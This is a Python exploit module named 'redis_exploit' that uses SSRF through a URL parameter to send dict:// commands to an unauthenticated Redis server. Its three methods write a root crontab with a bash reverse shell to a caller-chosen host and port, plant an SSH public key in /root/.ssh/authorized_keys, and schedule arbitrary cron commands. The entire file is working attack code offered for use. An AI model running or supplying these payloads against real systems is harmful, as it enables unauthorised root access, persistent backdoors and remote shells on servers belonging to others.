#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : mr.chery (mr.chery666@gmail.com)
import requests
from tools import payload_set


class redis_exploit(object):
    def __init__(self, url, param, host, port, bhost=None, bport=None, authorized_keys=None, command=None):
        self.url = url
        self.param = param
        self.host = host
        self.port = port
        self.bhost = bhost
        self.bport = bport
        self.authorized_keys = authorized_keys
        self.command = command
        self.dict_agreement = "dict://" + self.host + ":" + self.port + "/"

    def redis_shell(self):
        """
        redis写crontab反弹shell
        :return:
        """
        # config set dir /var/spool/cron/
        payload = self.dict_agreement + "config:set:dir:/var/spool/cron/"
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

        # config set dbfilename root
        payload = self.dict_agreement + "config:set:dbfilename:root"
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

        # set crontab command
        payload = self.dict_agreement + "set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20" \
                                        ">\\x26\\x20/dev/tcp/{}/{}\\x200>\\x261\\x0a\\x0a\\x0a\"".format(self.bhost,
                                                                                                         self.bport)
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

        # save to file
        payload = self.dict_agreement + "save"
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

    def redis_write_authorized_keys(self):
        """
        通过redis未授权访问写ssh公钥
        :return:
        """

        # config set dir /root/.ssh/
        payload = self.dict_agreement + "config:set:dir:/root/.ssh/"
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

        # config set dbfilename authorized_keys
        payload = self.dict_agreement + "config:set:dbfilename:authorized_keys"
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

        # set authorized_keys command
        key = self.authorized_keys
        payload = self.dict_agreement + "set:0:\"\\x0a\\x0a" + key + "\\x0a\\x0a\\x0a\"".replace("+", "\\x2b")
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

        # save to file
        payload = self.dict_agreement + "save"
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

    def redis_cron_command(self):
        """
        通过redis未授权向cron写入定时执行命令
        :return:
        """
        # config set dir /var/spool/cron/
        payload = self.dict_agreement + "config:set:dir:/var/spool/cron/"
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

        # config set dbfilename root
        payload = self.dict_agreement + "config:set:dbfilename:root"
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

        # set crontab command
        payload = self.dict_agreement + "set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20{}\\x0a\\x0a\\x0a\""\
            .format(self.command)
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)

        # save to file
        payload = self.dict_agreement + "save"
        url = payload_set.url_payload_set(self.url, self.param, payload)
        requests.get(url)